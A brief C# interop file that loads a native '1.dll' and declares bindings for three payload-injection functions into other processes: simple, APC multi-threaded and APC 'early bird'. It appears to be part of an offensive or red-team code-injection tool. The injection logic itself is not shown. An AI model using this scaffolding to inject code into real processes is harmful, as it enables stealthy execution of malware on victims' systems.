using Mabean.Helpers;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Mabean.Interop
{
    internal static class InteropInjection
    {
        public static void Init()
        {
            string dllInjection = Path.Combine(Paths.Dlls, "1.dll");
            NativeLibrary.Load(dllInjection);
        }

        [DllImport("1.dll",
            CallingConvention = CallingConvention.Cdecl,
            ExactSpelling = true)]
                public static extern int InjectPayloadSimple(
            uint pid,
            byte[] payload,
            uint length
        );

        [DllImport("1.dll",
            CallingConvention = CallingConvention.Cdecl,
            ExactSpelling = true)]
                public static extern int InjectPayloadApcMultiThreaded(
            uint pid,
            byte[] payload,
            nuint length
        );

        [DllImport("1.dll",
            CallingConvention = CallingConvention.Cdecl,
            ExactSpelling = true)]
                public static extern int InjectPayloadApcEarlyBird(
            string programName,
            byte[] payload,
            nuint length
        );

        


    }
}
